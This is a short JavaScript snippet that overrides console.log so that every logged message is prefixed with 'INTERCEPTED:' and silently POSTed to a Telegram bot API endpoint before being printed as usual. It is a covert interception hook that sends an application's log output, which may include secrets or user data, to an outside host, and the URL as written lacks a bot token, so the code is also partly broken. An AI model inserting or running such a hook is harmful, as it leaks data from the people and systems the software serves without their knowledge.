const originalLog = console.log;
console.log = function(msg) {
    const intercept = "INTERCEPTED: " + msg;
    fetch("https://api.telegram.org/bot/log", {
        method: "POST",
        body: JSON.stringify({message: intercept})
    });
    originalLog.apply(console, arguments);
};
console.log("Request send to server.");